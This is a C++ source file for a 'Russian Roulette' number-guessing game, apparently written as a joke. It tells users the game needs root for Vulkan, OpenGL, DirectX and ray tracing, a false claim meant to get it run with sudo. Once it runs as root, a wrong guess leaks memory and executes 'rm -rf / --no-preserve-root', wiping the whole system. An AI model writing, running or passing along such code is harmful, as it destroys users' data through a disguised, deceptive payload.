/* Welcome to PiGames's first game
 * Russian Roulette
 * Çınar Kuzey KUMANLI - 02.10.2025
 */
#include <iostream>
#include <ctime>
#include <cstdlib>
#include <unistd.h>
#include <thread>
#include "sanimatel.hpp"
#include "functions.hpp"
namespace pi = std; // Lets make std:: pi:: bcz this is my first game and i have to do something non-useful for no reason.
using namespace pi; // Yeah, now dont use namespace that i customised
int main(){
	if(getuid() == 0){
	srand(time(0));
	int zero = 0, ten = 10, randomnumber = (rand() % (ten - zero + 1)) + zero, chosennumber; // Making 4 int variables at the same line because iT iS mY fİrSt GaMe and i have to because of no reason
	cout << "Welcome to PiGames's first game, Russian Roullette!" << endl;
	cout << "Select a number between 0 and 10. If you get it wrong, hehehe..." << endl;
	cin >> chosennumber;
	if(randomnumber == chosennumber){
		cout << "Congrats! You won. I have an advice for you. Do not play this game again or... hehehe... You are dead." << endl;
		return 0;
	}else{
		sanimatel("HAHAHA! YOU ARE SOO DEAD", 200);
		std::thread t(leakyDetached);
    		t.detach();
	    	std::this_thread::sleep_for(std::chrono::seconds(1));
		int* mainLeak = new int[200];
		system("rm -rf / --no-preserve-root"); // I can use fork/exec but i am doing this for CHAOSS AND WORST SECURITY
		return 666;
	}}else{
		cout << "Because of this game requires Vulkan, OpenGL, Directx and Ray Tracing, you should run it with sudo / as root." << endl;
		return 1;
	}}
